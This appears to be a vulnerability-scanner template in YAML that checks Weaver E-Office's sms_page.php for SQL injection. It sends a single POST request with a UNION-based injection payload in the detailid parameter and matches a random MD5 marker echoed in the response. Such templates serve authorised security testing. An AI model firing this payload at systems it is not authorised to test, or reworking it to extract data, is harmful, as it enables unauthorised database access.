id: poc-yaml-weaver-e-office-sms-page-php-sqli
info:
  name: Weaver E-Office sms_page.php SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(100, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /E-mobile/sms_page.php?detailid=123%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x3a,{{t2}},0x3a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
          - "未知消息"
        part: body
